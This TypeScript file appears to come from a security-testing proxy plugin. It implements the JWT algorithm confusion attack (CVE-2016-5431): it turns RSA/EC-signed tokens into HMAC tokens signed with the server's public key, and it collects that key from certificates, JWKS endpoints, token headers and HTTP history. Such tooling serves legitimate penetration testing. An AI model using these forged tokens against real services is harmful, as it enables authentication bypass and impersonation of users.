/**
 * Algorithm Confusion Attack (CVE-2016-5431)
 *
 * Converts an RS256/RS384/RS512/ES256/ES384/ES512 token to HS256/HS384/HS512
 * and signs it using the server's public key as the HMAC secret.
 *
 * Sources for the public key (tried in order):
 *  1. Explicitly configured key/cert in plugin settings
 *  2. TLS certificate of the request host
 *  3. JWKS discovery at common well-known paths
 *  4. Embedded jku / x5c / x5u values from the original JWT header
 *  5. Public key recovered from multiple JWTs in HTTP history
 */

import { signHMAC } from "../crypto/jwt.js";
import { publicKeyPemToRawBytes, x509CertToPublicKeyPem, jwkToPublicKeyPem, jwksToPublicKeys } from "../crypto/rsa.js";
import { ecPublicKeyPemToRawBytes, x509CertToECPublicKeyPem } from "../crypto/ecdsa.js";
import { fetchTLSCertPem, discoverJWKS, fetchJWKS } from "../crypto/certFetch.js";
import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
import { nanoid } from "../util.js";

const ALG_CONFUSION_MAP: Record<string, "HS256" | "HS384" | "HS512"> = {
  RS256: "HS256", RS384: "HS384", RS512: "HS512",
  PS256: "HS256", PS384: "HS384", PS512: "HS512",
  ES256: "HS256", ES384: "HS384", ES512: "HS512",
};

function isAsymmetricAlg(alg: string): boolean {
  return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
}

function publicKeyPemToSecret(keyPem: string, originalAlg: string): Buffer {
  if (originalAlg.startsWith("ES")) {
    return ecPublicKeyPemToRawBytes(keyPem);
  }
  return publicKeyPemToRawBytes(keyPem);
}

function makeAttack(
  parsed: ParsedJWT,
  hmacAlg: "HS256" | "HS384" | "HS512",
  publicKeyPem: string,
  sourceDesc: string
): AttackResult {
  const header = { ...parsed.header, alg: hmacAlg };
  delete header.jku;
  delete header.jwk;
  delete header.x5u;
  delete header.x5c;
  delete header.kid;

  const secret = publicKeyPemToSecret(publicKeyPem, parsed.header.alg as string);
  const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);

  return {
    id: nanoid(),
    technique: "algConfusion",
    techniqueName: `Algorithm Confusion (${parsed.header.alg} → ${hmacAlg}, ${sourceDesc})`,
    description:
      `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's ` +
      `RSA/EC public key (${sourceDesc}) as the HMAC secret. ` +
      "Vulnerable servers using the same key object for both RS/ES and HS verification " +
      "will accept this token.",
    modifiedJWT: jwt,
    timestamp: Date.now(),
  };
}

export async function buildAlgConfusionAttacks(
  parsed: ParsedJWT,
  requestHost: string,
  requestPort: number,
  requestTls: boolean,
  config: PluginConfig,
  recoveredKeys: string[] = []
): Promise<AttackResult[]> {
  const originalAlg = parsed.header.alg as string;
  if (!isAsymmetricAlg(originalAlg)) return [];

  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const results: AttackResult[] = [];

  const addKey = (pem: string, source: string) => {
    try {
      results.push(makeAttack(parsed, hmacAlg, pem, source));
    } catch {
      // Skip invalid keys
    }
  };

  // 1. Explicitly configured key / cert
  if (config.customPublicKeyPem) {
    addKey(config.customPublicKeyPem, "configured public key");
  }
  if (config.customCertPem) {
    try {
      const pem = x509CertToPublicKeyPem(config.customCertPem);
      addKey(pem, "configured certificate");
    } catch { /* ignore */ }
  }

  // 2. TLS certificate of the target host
  if (requestTls || requestPort === 443) {
    try {
      const certPem = await fetchTLSCertPem(requestHost, requestPort);
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "TLS certificate");
    } catch { /* ignore */ }
  }

  // 3. Embedded jku in the original token
  if (parsed.header.jku) {
    try {
      const jwks = await fetchJWKS(parsed.header.jku as string);
      if (jwks) {
        for (const pem of jwksToPublicKeys(jwks)) {
          addKey(pem, `jku (${parsed.header.jku})`);
        }
      }
    } catch { /* ignore */ }
  }

  // 4. Embedded x5c chain
  if (parsed.header.x5c && Array.isArray(parsed.header.x5c) && parsed.header.x5c.length > 0) {
    try {
      const certDer = Buffer.from(parsed.header.x5c[0] as string, "base64");
      const certPem = `-----BEGIN CERTIFICATE-----\n${certDer.toString("base64").match(/.{1,64}/g)!.join("\n")}\n-----END CERTIFICATE-----\n`;
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "embedded x5c cert");
    } catch { /* ignore */ }
  }

  // 5. JWKS discovery
  const proto = requestTls ? "https" : "http";
  const port = (requestTls && requestPort === 443) || (!requestTls && requestPort === 80)
    ? ""
    : `:${requestPort}`;
  const baseUrl = `${proto}://${requestHost}${port}`;

  try {
    const discovered = await discoverJWKS(baseUrl, config.extraJwksPaths);
    for (const result of discovered) {
      for (const pem of jwksToPublicKeys({ keys: result.keys })) {
        addKey(pem, `JWKS (${result.url})`);
      }
    }
  } catch { /* ignore */ }

  // 6. Keys recovered from HTTP history analysis
  for (const pem of recoveredKeys) {
    addKey(pem, "recovered from HTTP history");
  }

  return results;
}
